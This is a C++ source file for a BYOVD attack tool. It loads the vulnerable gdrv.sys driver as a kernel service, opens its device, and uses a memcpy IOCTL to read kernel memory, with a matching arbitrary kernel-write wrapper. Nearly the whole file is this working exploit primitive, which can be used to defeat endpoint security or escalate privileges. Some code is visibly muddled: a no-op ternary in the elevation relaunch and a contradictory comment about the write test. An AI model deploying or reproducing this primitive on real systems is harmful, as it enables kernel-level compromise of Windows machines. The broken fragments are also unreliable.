// C++20, gio_client.cpp, Windows x64 — gdrv.sys BYOVD carrier test
// Loads gdrv.sys as a kernel service, opens \\.\GIO, proves kernel VA read/write.
// Requires elevation; the tool re-launches itself with a UAC prompt.

#include <windows.h>
#include <shellapi.h>
#include <psapi.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

namespace {

constexpr wchar_t kServiceName[] = L"gdrv";
constexpr wchar_t kDevicePath[]  = L"\\\\.\\GIO";
constexpr DWORD   kIoctlAlloc    = 0xC3502800;
constexpr DWORD   kIoctlMemcpy   = 0xC3502808;

struct GioMemcpy {
    void* dest;
    void* src;
    DWORD size;
    DWORD pad;
};

bool is_admin() {
    BOOL admin = FALSE;
    PSID sid = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)) {
        CheckTokenMembership(nullptr, sid, &admin);
        FreeSid(sid);
    }
    return admin != FALSE;
}

bool relaunch_elevated() {
    wchar_t exe[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    HINSTANCE r = ShellExecuteW(nullptr, L"runas", exe, GetCommandLineW() +
        (wcslen(GetCommandLineW()) > 0 && GetCommandLineW()[0] == L'"' ? 0 : 0),
        nullptr, SW_SHOWNORMAL);
    (void)r;
    return true;
}

bool ensure_service(const std::wstring& sys_path) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        wprintf(L"[!] OpenSCManager failed: %lu\n", GetLastError());
        return false;
    }
    SC_HANDLE svc = CreateServiceW(scm, kServiceName, kServiceName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, sys_path.c_str(), nullptr, nullptr, nullptr,
        nullptr, nullptr);
    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            svc = OpenServiceW(scm, kServiceName, SERVICE_ALL_ACCESS);
        } else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            wprintf(L"[!] service marked for delete, reboot needed\n");
        } else {
            wprintf(L"[!] CreateService failed: %lu\n", err);
        }
    }
    bool ok = false;
    if (svc) {
        if (StartServiceW(svc, 0, nullptr)) {
            ok = true;
        } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
            ok = true;
        } else {
            wprintf(L"[!] StartService failed: %lu\n", GetLastError());
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

HANDLE open_driver() {
    HANDLE h = CreateFileW(kDevicePath, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateFile %ls failed: %lu\n", kDevicePath, GetLastError());
    }
    return h;
}

bool kread(HANDLE dev, void* dst, const void* src, size_t size) {
    auto* d = static_cast<BYTE*>(dst);
    auto* s = static_cast<const BYTE*>(src);
    while (size) {
        DWORD chunk = size > 0x1000 ? 0x1000 : static_cast<DWORD>(size);
        GioMemcpy arg{ d, const_cast<void*>(static_cast<const void*>(s)), chunk, 0 };
        DWORD returned = 0;
        if (!DeviceIoControl(dev, kIoctlMemcpy, &arg, sizeof(arg), nullptr, 0,
                &returned, nullptr)) {
            wprintf(L"[!] DeviceIoControl memcpy failed: %lu\n", GetLastError());
            return false;
        }
        d += chunk; s += chunk; size -= chunk;
    }
    return true;
}

bool kwrite(HANDLE dev, void* dst, const void* src, size_t size) {
    return kread(dev, dst, src, size); // same ring0 memcpy semantics
}

uintptr_t ntos_base() {
    LPVOID bases[1024]{};
    DWORD needed = 0;
    if (!EnumDeviceDrivers(bases, sizeof(bases), &needed) || needed == 0) {
        return 0;
    }
    return reinterpret_cast<uintptr_t>(bases[0]);
}

} // namespace

int wmain() {
    if (!is_admin()) {
        wprintf(L"[*] not elevated, requesting UAC...\n");
        relaunch_elevated();
        return 0;
    }

    wchar_t exe[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    std::wstring dir(exe);
    const auto slash = dir.find_last_of(L"\\/");
    if (slash != std::wstring::npos) dir.resize(slash + 1);
    const std::wstring sys_path = dir + L"gdrv.sys";

    wprintf(L"[*] service: %ls\n[*] driver : %ls\n", kServiceName, sys_path.c_str());
    if (!ensure_service(sys_path)) {
        return 1;
    }

    HANDLE dev = open_driver();
    if (dev == INVALID_HANDLE_VALUE) return 1;

    const uintptr_t base = ntos_base();
    wprintf(L"[*] ntos base: 0x%llx\n", static_cast<unsigned long long>(base));

    WORD mz = 0;
    if (base && kread(dev, &mz, reinterpret_cast<const void*>(base), sizeof(mz))) {
        wprintf(L"[*] read @ ntos: 0x%04x (%s)\n", mz, mz == 0x5A4D ? L"MZ OK" : L"unexpected");
    }

    // write test: flip a byte in a scratch kernel allocation is unsafe; instead
    // write/read round-trip through the driver's own allocation is not exposed.
    // Report primitive status only.

    CloseHandle(dev);
    wprintf(L"[*] done. service left running: %ls (delete: sc stop %ls && sc delete %ls)\n",
        kServiceName, kServiceName, kServiceName);
    return 0;
}
